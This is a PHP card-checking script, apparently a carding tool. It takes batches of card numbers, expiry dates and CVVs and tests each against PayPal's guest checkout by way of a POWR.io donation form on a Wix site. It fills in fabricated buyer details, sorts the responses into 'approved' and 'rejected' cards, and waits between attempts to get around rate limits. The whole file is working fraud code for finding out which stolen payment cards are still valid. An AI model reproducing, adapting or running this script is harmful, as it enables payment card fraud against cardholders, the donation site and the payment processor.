<?php
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

$lista = $_GET['lista'] ?? null;
$cards = [];

if (!empty($lista)) {
    $lista = trim($lista);
    $lista = str_replace([" ", ":", ";", ",", "=>", "-", "/", "|||", "\r", "\n"], "|", $lista);
    $lista = preg_replace('/\|+/', '|', $lista);
    
    $tmp = explode("|", $lista);
    for ($i = 0; $i < count($tmp); $i += 4) {
        if (isset($tmp[$i + 3])) {
            $cc = trim($tmp[$i]);
            $mes = trim($tmp[$i+1]);
            $ano = trim($tmp[$i+2]);
            $cvv = trim($tmp[$i+3]);
            if (strlen($cc) >= 15 && strlen($cvv) >= 3) {
                $cards[] = "$cc|$mes|$ano|$cvv";
            }
        }
    }
    
    if (!empty($cards)) {
        file_put_contents('db.txt', implode("\n", $cards) . "\n");
    }
}

if (empty($cards) && file_exists('db.txt')) {
    $cards = file('db.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
}

if (empty($cards)) {
    die();
}

$current_card = array_shift($cards);
$separa = explode("|", $current_card);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

if (!empty($cards)) {
    file_put_contents('db.txt', implode("\n", $cards) . "\n");
} else {
    if (file_exists('db.txt')) unlink('db.txt');
}

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    if (!isset($str[1])) return '';
    $str = explode($end, $str[1]);
    return $str[0];
}

function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    if (!isset($str[$value])) return '';
    $str = explode($end, $str[$value]);
    return $str[0];
}

// --- BIN INFO SEGURO ---
$bin_info = "N/A";
$bin_number = substr($cc, 0, 6);

if (file_exists('bins.json')) {
    $json_str = file_get_contents('bins.json');
    $bins = json_decode($json_str, true);
    if (isset($bins[$bin_number])) {
        $a = json_encode($bins[$bin_number]);
        $bandeira = GetStr($a, 'bandeira":"', '"');
        $nivel    = GetStr($a, 'level":"', '"');
        $bank     = GetStr($a, 'banco":"', '"');
        $pais     = GetStr($a, 'pais":"', '"');
        $bin_info = trim("$bandeira $nivel $bank $pais");
    }
} 
if ($bin_info == "N/A" && file_exists('bins.csv')) {
    $contents = file_get_contents('bins.csv');
    $pattern = preg_quote($bin_number, '/');
    $pattern = "/^.*$pattern.*\$/m";
    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
        $pieces = explode(";", $encontrada);
        $bin_info = trim("$pieces[1] $pieces[2] $pieces[3] $pieces[4] $pieces[5]");
    }
}

// --- FLUXO POWR.IO ---
$url = 'https://www.powr.io/payments/paypal_smart_buttons'; 
$headers = array(
    'authority: www.powr.io',
    'accept: application/json',
    'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.powr.io',
    'referer: https://www.powr.io/plugins/form-builder/wix_cached_view?pageId=pqc3g&compId=comp-kq2c1egr&viewerCompId=comp-kq2c1egr&siteRevision=532&viewMode=site&deviceType=mobile&locale=en&tz=America%2FNew_York&regionalLanguage=en&width=280&height=1237&instance=G54PALyQJUrJS3hW6ZOHvUcdM9kssB1imASlx8JbzH4.eyJpbnN0YW5jZUlkIjoiYzliZDM4YjUtZWM1MS00YTQ1LTlkZWItOTc5Y2Y5ZmM1YmI4IiwiYXBwRGVmSWQiOiIxMzNjOGU5NS05MTJhLTg4MjYtZmEyNi01YTAwYTliY2Y1NzQiLCJzaWduRGF0ZSI6IjIwMjQtMDYtMjNUMTE6NDE6NDUuNDgzWiIsInZlbmRvclByb2R1Y3RJZCI6InBybyIsImRlbW9Nb2RlIjpmYWxzZSwiYWlkIjoiMTYxNjExMGYtODI3NC00MmEyLThlN2MtZDg1N2IzMjk2YzA5Iiwic2l0ZU93bmVySWQiOiIwZTBiNzM3My03M2IzLTRiMDEtYWVjNy0yZmMyMGZhNDc0MGEifQ&currency=USD&currentCurrency=USD&commonConfig=%7B%22brand%22%3A%22wix%22%2C%22host%22%3A%22VIEWER%22%2C%22bsi%22%3A%226ea7410e-0e4e-4c71-8f05-aaea01e86099%7C1%22%2C%22siteRevision%22%3A%22532%22%2C%22BSI%22%3A%226ea7410e-0e4e-4c71-8f05-aaea01e86099%7C1%22%7D&currentRoute=.%2Fdonate&vsi=e9a024f6-576a-412e-9662-4ed71929c8be',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
);
$data = 'price=1.00&memo=&quantity=1&discount_code=&line_items=%7B%22subTotal%22%3A1%2C%22discount%22%3A0%2C%22tax%22%3A0%2C%22shipping%22%3A0%2C%22forStripeMinimum%22%3A0%2C%22total%22%3A1%7D&pending_transaction_id=27339028&app_id=29177276&price_changed_by_user=true&product_option=';

$options = array(
    CURLOPT_URL            => $url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CUSTOMREQUEST  => 'POST',
    CURLOPT_POSTFIELDS     => $data,
    CURLOPT_HTTPHEADER     => $headers,
    CURLOPT_FOLLOWLOCATION => true, 
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
);

$ch = curl_init();
curl_setopt_array($ch, $options);
$r1 = curl_exec($ch);
$data_r1_decoded = json_decode($r1, true);
$token = $data_r1_decoded['TOKEN'] ?? null;
curl_close($ch);

if (!$token) {
    echo '<span class="text-danger">Reprovada</span><br>'.$current_card.'<br>Token não obtido<br>@wzzin_santos';
    exit;
}

$url = 'https://www.paypal.com/graphql?OnboardGuestMutation';
$headers = array(
    'authority: www.paypal.com',
    'accept: */*',
    'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type: application/json',
    'origin: https://www.paypal.com',
    'paypal-client-context: '.$token.'',
    'paypal-client-metadata-id: '.$token.'',
    'referer: https://www.paypal.com/checkoutweb/signup?token='.$token.'&locale.x=en_GB&fundingSource=paypal&sessionID=uid_8a15213a5c_mte6ndm6mdy&buttonSessionID=uid_85a6744c35_mte6ndm6mti&env=production&fundingOffered=paypal&logLevel=warn&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWxvYmplY3RzLmNvbS9hcGkvY2hlY2tvdXQuanMifQ&uid=15b309966d&version=4&xcomponent=1&ssrt=1719143298502&rcache=1&useraction=CONTINUE&country.x=IN&locale.x=en_IN&country.x=IN',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
);

$data = '{"operationName":"OnboardGuestMutation","variables":{"card":{"cardNumber":"'.$cc.'","expirationDate":"'.$mes.'/'.$ano.'","securityCode":"'.$cvv.'","type":"VISA"},"country":"US","email":"legendhr7555@gmail.com","firstName":"Badboy","lastName":"Chkumar","phone":{"countryCode":"1","number":"3049758788","type":"MOBILE"},"supportedThreeDsExperiences":["IFRAME"],"token":"'.$token.'","billingAddress":{"line1":"836 Prudential Dr","city":"Jacksonville","state":"FL","postalCode":"32207-8334","accountQuality":{"autoCompleteType":"ANS","isUserModified":false,"twoFactorPhoneVerificationId":""},"country":"US","familyName":"Chk","givenName":"Badboy"},"shippingAddress":{"line1":"836 Prudential Dr","city":"Jacksonville","state":"FL","postalCode":"32207-8334","accountQuality":{"autoCompleteType":"ANS","isUserModified":false,"twoFactorPhoneVerificationId":""},"country":"US","familyName":"Chk","givenName":"Badboy"},"crsData":null},"query":"mutation OnboardGuestMutation($bank: BankAccountInput, $billingAddress: AddressInput, $card: CardInput, $country: CountryCodes, $currencyConversionType: CheckoutCurrencyConversionType, $dateOfBirth: DateOfBirth, $email: String, $firstName: String\u0021, $lastName: String\u0021, $phone: PhoneInput, $shareAddressWithDonatee: Boolean, $shippingAddress: AddressInput, $supportedThreeDsExperiences: [ThreeDSPaymentExperience], $token: String\u0021) {\\n  onboardAccount: onboardGuest(\\n    bank: $bank\\n    billingAddress: $billingAddress\\n    card: $card\\n    country: $country\\n    currencyConversionType: $currencyConversionType\\n    dateOfBirth: $dateOfBirth\\n    email: $email\\n    firstName: $firstName\\n    lastName: $lastName\\n    phone: $phone\\n    shareAddressWithDonatee: $shareAddressWithDonatee\\n    shippingAddress: $shippingAddress\\n    token: $token\\n  ) {\\n    buyer {\\n      auth {\\n        accessToken\\n        __typename\\n      }\\n      userId\\n      __typename\\n    }\\n    flags {\\n      is3DSecureRequired\\n      __typename\\n    }\\n    ...fundingOptions\\n    paymentContingencies {\\n      threeDomainSecure(experiences: $supportedThreeDsExperiences) {\\n        status\\n        redirectUrl {\\n          href\\n          __typename\\n        }\\n        method\\n        parameter\\n        experience\\n        requestParams {\\n          key\\n          value\\n          __typename\\n        }\\n        __typename\\n      }\\n      ...threeDSContingencyData\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\\nfragment fundingOptions on CheckoutSession {\\n  fundingOptions {\\n    allPlans {\\n      fundingSources {\\n        fundingInstrument {\\n          id\\n          __typename\\n        }\\n        amount {\\n          currencyCode\\n          currencyValue\\n          __typename\\n        }\\n        __typename\\n      }\\n      __typename\\n    }\\n    fundingInstrument {\\n      id\\n      lastDigits\\n      name\\n      nameDescription\\n      type\\n      __typename\\n    }\\n    __typename\\n  }\\n  __typename\\n}\\n\\nfragment threeDSContingencyData on PaymentContingencies {\\n  threeDSContingencyData {\\n    name\\n    causeName\\n    resolution {\\n      type\\n      resolutionName\\n      paymentCard {\\n        billingAddress {\\n          line1\\n          line2\\n          city\\n          state\\n          country\\n          postalCode\\n          __typename\\n        }\\n        expireYear\\n        expireMonth\\n        currencyCode\\n        cardProductClass\\n        id\\n        encryptedNumber\\n        type\\n        number\\n        bankIdentificationNumber\\n        __typename\\n      }\\n      contingencyContext {\\n        deviceDataCollectionUrl {\\n          href\\n          __typename\\n        }\\n        jwtSpecification {\\n          jwtDuration\\n          jwtIssuer\\n          jwtOrgUnitId\\n          type\\n          __typename\\n        }\\n        reason\\n        referenceId\\n        source\\n        __typename\\n      }\\n      __typename\\n    }\\n    __typename\\n  }\\n  __typename\\n}\\n"}';

$options = array(
    CURLOPT_URL            => $url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CUSTOMREQUEST  => 'POST',
    CURLOPT_POSTFIELDS     => $data,
    CURLOPT_HTTPHEADER     => $headers,
    CURLOPT_FOLLOWLOCATION => true, 
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
);

$ch = curl_init();
curl_setopt_array($ch, $options);
$response = curl_exec($ch);
curl_close($ch);

// --- EXTRAÇÃO DA MENSAGEM DE RETORNO (MANTENDO O BLOCO ORIGINAL) ---
$mensagem_retorno = "CARD_GENERIC_ERROR"; // padrão para reprovadas

// Tenta extrair uma mensagem mais específica do JSON de resposta
$json_resp = json_decode($response, true);
if (isset($json_resp['errors'][0]['message'])) {
    $mensagem_retorno = $json_resp['errors'][0]['message'];
} elseif (isset($json_resp['data']['onboardAccount']['paymentContingencies']['threeDomainSecure']['status'])) {
    $mensagem_retorno = "3DS Status: " . $json_resp['data']['onboardAccount']['paymentContingencies']['threeDomainSecure']['status'];
} elseif (strpos($response, '"status": "succeeded"') !== false) {
    $mensagem_retorno = "CHARGED 1$ SUCCESSFULLY";
} elseif (strpos($response, 'SUCCESS') !== false) {
    $mensagem_retorno = "SUCCESS";
} elseif (strpos($response, 'INVALID_BILLING_ADDRESS') !== false) {
    $mensagem_retorno = "INVALID BILLING ADDRESS";
} elseif (strpos($response, 'INVALID_SECURITY_CODE') !== false) {
    $mensagem_retorno = "INVALID SECURITY CODE";
} elseif (strpos($response, 'EXISTING_ACCOUNT_RESTRICTED') !== false) {
    $mensagem_retorno = "EXISTING ACCOUNT RESTRICTED";
} elseif (strpos($response, 'ADD_SHIPPING_ERROR') !== false) {
    $mensagem_retorno = "ADD SHIPPING ERROR";
} elseif (strpos($response, 'GUEST_CARD_COUNTRY_MISMATCH') !== false) {
    $mensagem_retorno = "GUEST CARD COUNTRY MISMATCH";
} elseif (strpos($response, 'is3DSecureRequired') !== false) {
    $mensagem_retorno = "3D SECURE REQUIRED";
} elseif (strpos($response, 'RISK_DISALLOWED') !== false) {
    $mensagem_retorno = "RISK DISALLOWED";
}

// ======================= BLOCO DE RETORNO (COM MENSAGEM) =======================
if (strpos($response, '"status": "succeeded"') !== false || 
    strpos($response, 'Thank You For Donation.') !== false || 
    strpos($response, 'Your payment has already been processed') !== false || 
    strpos($response, 'Success') !== false || 
    strpos($response, '/donations/thank_you?donation_number=') !== false ||
    strpos($response, 'PAYER_CANNOT_PAY') !== false ||
    strpos($response, 'INVALID_BILLING_ADDRESS') !== false || 
    strpos($response, 'INVALID_SECURITY_CODE') !== false || 
    strpos($response, 'EXISTING_ACCOUNT_RESTRICTED') !== false || 
    strpos($response, 'SUCCESS') !== false || 
    strpos($response, 'GUEST_CARD_COUNTRY_MISMATCH') !== false || 
    strpos($response, 'is3DSecureRequired') !== false || 
    strpos($response, 'RISK_DISALLOWED') !== false) {

    echo '<span class="text-success">Aproved</span> ✅<br>'.$current_card.'<br>['.$bin_info.']<br>'.$mensagem_retorno.'<br>@wzzin_santos';

} else {
    echo '<span class="text-danger">Reprovada</span><br>'.$current_card.'<br>['.$bin_info.']<br>'.$mensagem_retorno.'<br>@wzzin_santos';
}
// ============================================================================================

ob_flush();

// Delay de 4 segundos para evitar rate limit
sleep(4);
?>
